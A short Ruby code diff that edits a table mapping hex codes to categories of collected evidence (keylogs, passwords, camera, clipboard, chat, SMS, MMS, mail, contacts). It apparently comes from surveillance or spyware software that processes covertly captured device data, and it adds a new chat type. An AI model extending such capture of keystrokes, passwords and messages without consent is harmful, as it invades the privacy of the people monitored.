@@ -14,12 +14,13 @@ EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x0040 => :KEYLOG,
                    0xE9E9 => :CAMERA,
                    0xC6C6 => :CHAT,
+                   0xC6C7 => :CHATNEW,
                    0x0300 => :CHATSKYPE,
                    0x0301 => :SOCIAL,      #formato identico a chat
                    0x0280 => :MOUSE,
                    0x0100 => :PRINT,
                    0x0180 => :URL,
-                   0x0181 => :URLCAPTURE,  #missing
+                   0x0181 => :URLCAPTURE,
                    0xD9D9 => :CLIPBOARD,
                    0xFAFA => :PASSWORD,
                    0x0000 => :FILEOPEN,    #file
@@ -31,7 +32,7 @@ EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x1001 => :MAIL,
                    0x0211 => :SMS,
                    0x0213 => :SMSNEW,
-                   0x0212 => :MMS,         #missing  #message
+                   0x0212 => :MMS,         #message
                    0x0200 => :ADDRESSBOOK,
                    0x0250 => :IADDRESSBOOK,
                    0x0201 => :CALENDAR,
